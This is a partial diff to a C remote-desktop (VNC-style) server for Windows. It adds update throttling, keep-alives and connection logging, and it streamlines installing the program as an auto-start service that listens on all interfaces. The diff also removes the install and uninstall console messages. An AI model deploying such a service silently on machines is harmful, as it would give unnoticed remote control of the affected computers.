-            for (int y = 0; y < scr->height; y++) {
-                if (write_exact(s, scr->bits + y * row_bytes, row_bytes) < 0) return -1;
-            }
+        DWORD since = now - last_send_tick;
+        if (st.need_update && (since >= min_interval_ms || st.force_full)) {
+            int force = st.force_full;
+            st.force_full = 0;
+            st.need_update = 0;
+            last_send_tick = now;
+            if (send_fb_update(s, scr, force) < 0) goto session_end;
+        } else if (st.need_update && since >= starve_ms) {
+            /* Keep-alive: if nothing's been dirty for a while, still respond
+             * so the client doesn't think we died. */
+            last_send_tick = now;
+            st.need_update = 0;
+            uint8_t hdr[4]; hdr[0]=0; hdr[1]=0; pack_u16(hdr+2, 0);
+            if (write_exact(s, hdr, 4) < 0) goto session_end;
         }
+
+        /* Wait a short bit for more input or a dirty probe tick. */
+        fd_set rd; FD_ZERO(&rd); FD_SET(s, &rd);
+        struct timeval tv = {0, 16 * 1000}; /* 16 ms → dirty probe @ ~60 Hz */
+        select(0, &rd, NULL, NULL, &tv);
     }
+
+session_end:
+    vlog("=== session end: ptr=%u key=%u fbreq=%u setenc=%u setfmt=%u cut=%u ===",
+         st.cnt_ptr, st.cnt_key, st.cnt_fbreq, st.cnt_setenc, st.cnt_setfmt, st.cnt_cut);
+    return 0;
 }
 
 /* ──────────────────────── listener loop ───────────────────────────── */
 static void server_run(void) {
+    log_init();
+    vlog("=== server starting (pid=%lu sess=%lu) ===",
+         (unsigned long)GetCurrentProcessId(), (unsigned long)0);
+
     WSADATA w; WSAStartup(MAKEWORD(2,2), &w);
     Screen scr = {0};
-    if (screen_init(&scr) < 0) { log_dbg("screen_init failed"); return; }
+    if (screen_init(&scr) < 0) { vlog("screen_init failed"); return; }
+    vlog("screen %dx%d (%dx%d tiles)", scr.width, scr.height, scr.tiles_x, scr.tiles_y);
 
     int port = cfg_port();
     char password[9]; cfg_password(password);
+    vlog("listening port=%d", port);
 
     SOCKET srv = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
     int on = 1; setsockopt(srv, SOL_SOCKET, SO_REUSEADDR, (char*)&on, sizeof(on));
@@ -509,18 +684,19 @@ static void server_run(void) {
     addr.sin_family = AF_INET;
     addr.sin_port = htons((uint16_t)port);
     addr.sin_addr.s_addr = INADDR_ANY;
-    if (bind(srv, (struct sockaddr*)&addr, sizeof(addr)) < 0) { log_dbg("bind :%d failed", port); return; }
+    if (bind(srv, (struct sockaddr*)&addr, sizeof(addr)) < 0) { vlog("bind failed"); return; }
     if (listen(srv, 4) < 0) return;
-    log_dbg("listening on %d", port);
 
     while (!g_stop_requested) {
         fd_set rd; FD_ZERO(&rd); FD_SET(srv, &rd);
         struct timeval tv = {1, 0};
         if (select(0, &rd, NULL, NULL, &tv) <= 0) continue;
 
-        SOCKET c = accept(srv, NULL, NULL);
+        struct sockaddr_in peer; int plen = sizeof(peer);
+        SOCKET c = accept(srv, (struct sockaddr*)&peer, &plen);
         if (c == INVALID_SOCKET) continue;
-        /* serve in-thread: single-client is fine for our use case */
+        vlog("accept %s:%d",
+             inet_ntoa(peer.sin_addr), (int)ntohs(peer.sin_port));
         rfb_session(c, &scr, password);
         closesocket(c);
     }
@@ -545,39 +721,31 @@ static void WINAPI svc_main(DWORD argc, LPSTR *argv) {
     g_svc_status.dwCurrentState = SERVICE_RUNNING;
     g_svc_status.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
     SetServiceStatus(g_svc_handle, &g_svc_status);
-
     server_run();
-
     g_svc_status.dwCurrentState = SERVICE_STOPPED;
     SetServiceStatus(g_svc_handle, &g_svc_status);
 }
-
 static int do_install(void) {
     char exe[MAX_PATH]; GetModuleFileNameA(NULL, exe, sizeof(exe));
     char cmd[1024];
     snprintf(cmd, sizeof(cmd), "\"%s\" -service", exe);
     SC_HANDLE scm = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
-    if (!scm) { printf("OpenSCManager failed %lu\n", GetLastError()); return 1; }
+    if (!scm) return 1;
     SC_HANDLE svc = CreateServiceA(scm, SERVICE_NAME, SERVICE_DISPLAY,
         SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, SERVICE_AUTO_START,
         SERVICE_ERROR_NORMAL, cmd, NULL, NULL, NULL, NULL, NULL);
-    if (!svc) {
-        DWORD e = GetLastError();
-        if (e == ERROR_SERVICE_EXISTS) {
-            printf("service already exists — removing old one first\n");
-            svc = OpenServiceA(scm, SERVICE_NAME, DELETE);
-            if (svc) { DeleteService(svc); CloseServiceHandle(svc); }
-            svc = CreateServiceA(scm, SERVICE_NAME, SERVICE_DISPLAY,
-                SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, SERVICE_AUTO_START,
-                SERVICE_ERROR_NORMAL, cmd, NULL, NULL, NULL, NULL, NULL);
-        }
-        if (!svc) { printf("CreateService failed %lu\n", GetLastError()); CloseServiceHandle(scm); return 1; }
+    if (!svc && GetLastError() == ERROR_SERVICE_EXISTS) {
+        svc = OpenServiceA(scm, SERVICE_NAME, DELETE);
+        if (svc) { DeleteService(svc); CloseServiceHandle(svc); }
+        svc = CreateServiceA(scm, SERVICE_NAME, SERVICE_DISPLAY,
+            SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, SERVICE_AUTO_START,
+            SERVICE_ERROR_NORMAL, cmd, NULL, NULL, NULL, NULL, NULL);
     }
+    if (!svc) { CloseServiceHandle(scm); return 1; }
     SERVICE_DESCRIPTIONA desc = { SERVICE_DESC };
     ChangeServiceConfig2A(svc, SERVICE_CONFIG_DESCRIPTION, &desc);
     StartServiceA(svc, 0, NULL);
     CloseServiceHandle(svc); CloseServiceHandle(scm);
-    printf("installed + started %s\n", SERVICE_NAME);
     return 0;
 }
 static int do_uninstall(void) {
@@ -591,16 +759,14 @@ static int do_uninstall(void) {
         CloseServiceHandle(svc);
     }
     CloseServiceHandle(scm);
-    printf("uninstalled %s\n", SERVICE_NAME);
     return 0;
 }
 
-/* ──────────────────────── entry point ─────────────────────────────── */
 int main(int argc, char **argv) {
     if (argc >= 2 && strcmp(argv[1], "-install")   == 0) return do_install();
     if (argc >= 2 && strcmp(argv[1], "-uninstall") == 0) return do_uninstall();
     if (argc >= 2 && strcmp(argv[1], "-console")   == 0) {
-        printf("%s listening, press Ctrl+C to stop\n", SERVER_BANNER);
+        printf("%s listening, Ctrl+C to stop\n", SERVER_BANNER);
         server_run();
         return 0;
     }
